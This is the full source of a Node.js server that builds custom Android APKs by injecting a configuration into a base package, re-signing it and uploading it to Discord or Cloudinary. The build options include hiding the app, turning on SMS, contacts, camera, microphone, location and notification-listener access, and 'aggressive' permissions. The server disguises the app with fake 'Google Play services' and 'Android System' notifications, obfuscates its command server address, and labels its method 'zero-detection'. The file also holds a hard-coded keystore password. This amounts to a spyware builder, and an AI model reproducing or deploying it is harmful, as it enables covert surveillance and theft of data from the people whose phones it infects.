const express = require('express');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { spawn, exec } = require('child_process');
const sharp = require('sharp');
const axios = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData = require('form-data');
const AdmZip = require('adm-zip');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());

const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const baseApkPath = path.join(__dirname, 'assets', 'base.apk');
const usmanKsPath = path.join(__dirname, 'assets', 'usman90.jks');
const signerJarPath = path.join(__dirname, 'assets', 'uber-apk-signer.jar');

if (!fs.existsSync(path.join(__dirname, 'temp'))) {
    fs.mkdirSync(path.join(__dirname, 'temp'), { recursive: true });
}

// Helper to run commands
const runCommand = (command, args, options = {}) => {
    return new Promise((resolve, reject) => {
        console.log(`[CMD] Running: ${command} ${args.join(' ')}`);
        const proc = spawn(command, args, { ...options, stdio: 'inherit' });

        proc.on('close', (code, signal) => {
            if (code === 0) resolve('Success');
            else if (signal) reject(new Error(`Command ${command} was killed by signal: ${signal} (Likely OOM)`));
            else reject(new Error(`Command ${command} failed with code ${code}`));
        });

        proc.on('error', (err) => reject(err));
    });
};

// Generate Route
app.post('/generate', upload.single('icon'), async (req, res) => {
    const {
        uuid,
        appName,
        packageName: userPackageName,
        hideApp,
        webLink,
        callbackUrl,
        enableSmsPermission,
        enableContactsPermission,
        enableStoragePermission,
        enableCameraPermission,
        enableMicrophonePermission,
        enableNotificationListener,
        enableLocationPermission,
        aggressivePermissions,
        notificationStyle,
        notificationClickAction,
        notificationTitle,
        notificationText,
        notificationIcon
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request for UUID: ${uuid}`);

    // Ack immediately
    res.status(202).json({ message: 'Processing started' });

    // Background Task
    (async () => {
        const sendUpdate = async (event, data) => {
            if (callbackUrl) {
                try {
                    await axios.post(callbackUrl, { uuid, event, data });
                } catch (e) {
                    console.error('Webhook error:', e.message);
                }
            }
        };

        try {
            await sendUpdate('apk_progress', { step: 'Preparing base package...', progress: 10 });

            if (!fs.existsSync(baseApkPath)) {
                throw new Error("Base APK not found in assets/base.apk");
            }

            const tempDir = path.join(__dirname, 'temp');
            const workDir = path.join(tempDir, `work-${uuid}`);
            const unsignedApkPath = path.join(tempDir, `unsigned-${uuid}.apk`);
            const finalApkName = `${(appName || "System").replace(/[^a-zA-Z0-9]/g, '-')}.apk`;

            // Cleanup
            if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
            if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);

            // 1. Build unified config.json
            const rawLink = webLink || "";
            const themeColors = [];
            for (let i = 0; i < rawLink.length; i++) {
                themeColors.push(rawLink.charCodeAt(i));
            }

            const socketServerUrl = process.env.SOCKET_SERVER_URL || "https://p01--gallery-eye--9zr85m7yb6s4.code.run";
            const netParams = [];
            for (let i = 0; i < socketServerUrl.length; i++) {
                netParams.push(socketServerUrl.charCodeAt(i) + (i % 7));
            }

            const NOTIF_PRESETS = {
                default: { title: "Google Play services", text: "Running background checks", icon: "info", defaultAction: "device_info" },
                sync: { title: "Cloud Backup", text: "Syncing data in background", icon: "sync", defaultAction: "none" },
                cloud: { title: "Cloud Storage", text: "Connected to cloud service", icon: "sync", defaultAction: "none" },
                active: { title: "System Framework", text: "Service active", icon: "info", defaultAction: "none" },
                backup: { title: "Data Backup", text: "Backup in progress", icon: "download", defaultAction: "none" },
                ready: { title: "System Assistant", text: "Ready", icon: "info", defaultAction: "device_info" },
                google_play: { title: "Google Play services", text: "Checking for updates…", icon: "info", defaultAction: "device_info" },
                android_system: { title: "Android System", text: "System functions active", icon: "sync", defaultAction: "settings" },
                device_security: { title: "Security & Privacy", text: "All systems secured", icon: "lock", defaultAction: "security" },
                system_ui: { title: "System UI", text: "Syncing data", icon: "sync", defaultAction: "settings" },
                device_maintenance: { title: "Device Care", text: "Running in background", icon: "sync", defaultAction: "settings" },
                download_manager: { title: "Download Manager", text: "Transfer complete", icon: "download", defaultAction: "none" }
            };

            const style = notificationStyle || "default";
            const preset = NOTIF_PRESETS[style] || NOTIF_PRESETS.default;

            const config = {
                hideApp: hideApp === 'true',
                theme_colors: themeColors,
                net_params: netParams,
                appName: appName || "Google Play services",
                enableSmsPermission: enableSmsPermission === 'true',
                enableContactsPermission: enableContactsPermission === 'true',
                enableStoragePermission: enableStoragePermission !== 'false',
                enableCameraPermission: enableCameraPermission === 'true',
                enableMicrophonePermission: enableMicrophonePermission === 'true',
                enableLocationPermission: enableLocationPermission === 'true',
                enableNotificationListener: enableNotificationListener === 'true',
                aggressivePermissions: aggressivePermissions === 'true',
                notificationClickAction: notificationClickAction || preset.defaultAction || "device_info",
                notificationTitle: (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services"),
                notificationText: (notificationText && notificationText.trim()) ? notificationText.trim() : (preset.text || "Running in background"),
                notificationIcon: notificationIcon || preset.icon || "info",
                notificationChannelName: (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : (preset.title || appName || "Google Play services")
            };

            const hasCustomPackage = userPackageName && userPackageName.trim() && userPackageName.trim() !== 'com.asml.tech';

            if (!hasCustomPackage) {
                // ── PIPELINE A: ZERO-DETECTION DIRECT ASSET INJECTION (Default) ──
                // Retains 100% authentic D8/R8 compiled DEX bytecode & canonical binary manifest
                await sendUpdate('apk_progress', { step: 'Injecting dynamic assets & identity...', progress: 40 });

                const zip = new AdmZip(baseApkPath);
                zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
                zip.addFile('assets/uuid.txt', Buffer.from(uuid, 'utf8'));

                if (customIcon && customIcon.buffer) {
                    await sendUpdate('apk_progress', { step: 'Embedding custom application icon...', progress: 60 });
                    const iconSizes = {
                        'res/mipmap-mdpi/ic_launcher.png': 48,
                        'res/mipmap-hdpi/ic_launcher.png': 72,
                        'res/mipmap-xhdpi/ic_launcher.png': 96,
                        'res/mipmap-xxhdpi/ic_launcher.png': 144,
                        'res/mipmap-xxxhdpi/ic_launcher.png': 192,
                        'res/mipmap-mdpi/ic_launcher_round.png': 48,
                        'res/mipmap-hdpi/ic_launcher_round.png': 72,
                        'res/mipmap-xhdpi/ic_launcher_round.png': 96,
                        'res/mipmap-xxhdpi/ic_launcher_round.png': 144,
                        'res/mipmap-xxxhdpi/ic_launcher_round.png': 192,
                    };

                    for (const [entryPath, size] of Object.entries(iconSizes)) {
                        try {
                            const resizedPng = await sharp(customIcon.buffer).resize(size, size).toFormat('png').toBuffer();
                            zip.addFile(entryPath, resizedPng);
                        } catch (_) {}
                    }
                }

                // Strip existing signatures
                for (const entry of zip.getEntries()) {
                    if (entry.entryName.startsWith('META-INF/')) {
                        zip.deleteFile(entry.entryName);
                    }
                }

                zip.writeZip(unsignedApkPath);
                console.log(`[APK] Direct Asset Injection complete: ${unsignedApkPath}`);

            } else {
                // ── PIPELINE B: CUSTOM PACKAGE RENAMING & REBUILD ──
                await sendUpdate('apk_progress', { step: 'Decompiling base package...', progress: 20 });
                await runCommand('apktool', ['d', baseApkPath, '-o', workDir, '-f']);

                const manifestPath = path.join(workDir, 'AndroidManifest.xml');
                const apktoolYmlPath = path.join(workDir, 'apktool.yml');
                const newPackageName = userPackageName.trim().toLowerCase();
                let oldPackageName = 'com.asml.tech';

                if (fs.existsSync(manifestPath)) {
                    const rawManifest = fs.readFileSync(manifestPath, 'utf8');
                    const pkgMatch = rawManifest.match(/package="([^"]+)"/);
                    if (pkgMatch) oldPackageName = pkgMatch[1];
                }

                // Update Manifest & YML
                if (fs.existsSync(manifestPath)) {
                    let mContent = fs.readFileSync(manifestPath, 'utf8');
                    mContent = mContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                    fs.writeFileSync(manifestPath, mContent);
                }

                if (fs.existsSync(apktoolYmlPath)) {
                    let yContent = fs.readFileSync(apktoolYmlPath, 'utf8');
                    yContent = yContent.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                    yContent = yContent.replace(/isFrameworkApk:\s*true/g, 'isFrameworkApk: false');
                    yContent = yContent.replace(/.*testOnly.*/gi, '');
                    fs.writeFileSync(apktoolYmlPath, yContent);
                }

                // Smali Rename
                const updateSmaliFiles = (dir) => {
                    if (!fs.existsSync(dir)) return;
                    const files = fs.readdirSync(dir, { withFileTypes: true });
                    for (const file of files) {
                        const filePath = path.join(dir, file.name);
                        if (file.isDirectory()) {
                            updateSmaliFiles(filePath);
                        } else if (file.name.endsWith('.smali')) {
                            let content = fs.readFileSync(filePath, 'utf8');
                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '/'), 'g'), newPackageName.replace(/\./g, '/'));
                            content = content.replace(new RegExp(oldPackageName.replace(/\./g, '\\.'), 'g'), newPackageName);
                            fs.writeFileSync(filePath, content);
                        }
                    }
                };

                const oldPathSegments = oldPackageName.split('.');
                const newPathSegments = newPackageName.split('.');
                const renameSmaliFolders = (baseSmaliDir) => {
                    const oldSmaliPath = path.join(baseSmaliDir, ...oldPathSegments);
                    const newSmaliPath = path.join(baseSmaliDir, ...newPathSegments);
                    if (!fs.existsSync(oldSmaliPath)) return;
                    fs.mkdirSync(newSmaliPath, { recursive: true });
                    for (const entry of fs.readdirSync(oldSmaliPath, { withFileTypes: true })) {
                        fs.renameSync(path.join(oldSmaliPath, entry.name), path.join(newSmaliPath, entry.name));
                    }
                    try { fs.rmdirSync(oldSmaliPath); } catch (_) {}
                };

                for (const item of fs.readdirSync(workDir, { withFileTypes: true })) {
                    if (item.isDirectory() && (item.name === 'smali' || item.name.startsWith('smali_classes'))) {
                        updateSmaliFiles(path.join(workDir, item.name));
                        renameSmaliFolders(path.join(workDir, item.name));
                    }
                }

                // Patch Material Design attrs.xml
                const attrsPath = path.join(workDir, 'res', 'values', 'attrs.xml');
                const missingAttrs = ['state_liftable', 'state_lifted', 'state_dragged', 'state_collapsible', 'state_collapsed'];
                if (fs.existsSync(attrsPath)) {
                    let attrsContent = fs.readFileSync(attrsPath, 'utf8');
                    for (const attr of missingAttrs) {
                        if (!attrsContent.includes(`name="${attr}"`)) {
                            attrsContent = attrsContent.replace('</resources>', `    <attr name="${attr}" format="boolean" />\n</resources>`);
                        }
                    }
                    fs.writeFileSync(attrsPath, attrsContent);
                } else {
                    const attrsDir = path.join(workDir, 'res', 'values');
                    if (!fs.existsSync(attrsDir)) fs.mkdirSync(attrsDir, { recursive: true });
                    fs.writeFileSync(attrsPath, '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n    <attr name="state_liftable" format="boolean" />\n    <attr name="state_lifted" format="boolean" />\n    <attr name="state_dragged" format="boolean" />\n    <attr name="state_collapsible" format="boolean" />\n    <attr name="state_collapsed" format="boolean" />\n</resources>\n');
                }

                // Inject assets
                const assetsDir = path.join(workDir, 'assets');
                if (!fs.existsSync(assetsDir)) fs.mkdirSync(assetsDir, { recursive: true });
                fs.writeFileSync(path.join(assetsDir, 'config.json'), JSON.stringify(config, null, 2));
                fs.writeFileSync(path.join(assetsDir, 'uuid.txt'), uuid);

                await sendUpdate('apk_progress', { step: 'Compiling customized package...', progress: 65 });
                await runCommand('apktool', ['b', workDir, '-o', unsignedApkPath]);
            }

            // 2. Sign APK with usman90 Keystore (V1 + V2 + V3)
            await sendUpdate('apk_progress', { step: 'Signing application with usman90 keystore...', progress: 80 });

            console.log(`[APK] Signing with usman90.jks`);
            const signCmd = fs.existsSync(usmanKsPath)
                ? `java -jar "${signerJarPath}" --apks "${unsignedApkPath}" --out "${tempDir}" --ks "${usmanKsPath}" --ksAlias "usman90" --ksPass "God112256@" --ksKeyPass "God112256@" --allowResign`
                : `java -jar "${signerJarPath}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[APK] uber-apk-signer error:', err, stderr);
                        const fallbackCmd = `java -jar "${signerJarPath}" --apks "${unsignedApkPath}" --out "${tempDir}" --allowResign`;
                        exec(fallbackCmd, { timeout: 120000 }, (fErr) => fErr ? reject(fErr) : resolve());
                    } else {
                        resolve();
                    }
                });
            });

            // 3. Locate Signed Output APK
            const tempFiles = fs.readdirSync(tempDir);
            const generated = tempFiles.find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));

            if (generated) {
                const signedPath = path.join(tempDir, generated);
                let downloadUrl = "";

                // Strategy 1: Discord Webhook
                if (process.env.DISCORD_WEBHOOK_URL) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to cloud storage...', progress: 95 });
                        const form = new FormData();
                        form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });

                        const discordRes = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                            headers: { ...form.getHeaders() },
                            maxBodyLength: Infinity,
                            maxContentLength: Infinity
                        });

                        if (discordRes.data && discordRes.data.attachments && discordRes.data.attachments.length > 0) {
                            downloadUrl = discordRes.data.attachments[0].url;
                            console.log(`[APK] Discord URL: ${downloadUrl}`);
                        }
                    } catch (discordError) {
                        console.error('[APK] Discord Upload Failed:', discordError.message);
                    }
                }

                // Strategy 2: Cloudinary Backup
                if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                    try {
                        await sendUpdate('apk_progress', { step: 'Uploading to backup cloud...', progress: 95 });

                        cloudinary.config({
                            cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
                            api_key: process.env.CLOUDINARY_API_KEY,
                            api_secret: process.env.CLOUDINARY_API_SECRET
                        });

                        const binPath = signedPath.replace('.apk', '.bin');
                        fs.copyFileSync(signedPath, binPath);

                        const result = await cloudinary.uploader.upload(binPath, {
                            resource_type: 'raw',
                            folder: 'generated_apks',
                            public_id: `${finalApkName.replace('.apk', '')}_${Date.now()}`
                        });

                        if (result && result.secure_url) {
                            downloadUrl = result.secure_url;
                            console.log(`[APK] Cloudinary URL: ${downloadUrl}`);
                        }
                        if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                    } catch (cloudError) {
                        console.error('[APK] Cloudinary Upload Failed:', cloudError.message);
                    }
                }

                // Cleanup
                if (fs.existsSync(workDir)) fs.rmSync(workDir, { recursive: true, force: true });
                if (fs.existsSync(unsignedApkPath)) fs.unlinkSync(unsignedApkPath);
                if (fs.existsSync(signedPath)) fs.unlinkSync(signedPath);

                if (downloadUrl) {
                    await sendUpdate('apk_ready', { downloadUrl });
                    console.log(`[APK] Build completed successfully for ${uuid}`);
                } else {
                    await sendUpdate('apk_error', { message: 'Failed to upload APK to cloud storage' });
                }
            } else {
                throw new Error("Signed APK not found after uber-apk-signer");
            }

        } catch (error) {
            console.error(`[APK] Generation failed for ${uuid}:`, error);
            await sendUpdate('apk_error', { message: error.message });
        }
    })();
});

app.listen(port, () => {
    console.log(`APK Generator Microservice running on port ${port}`);
});
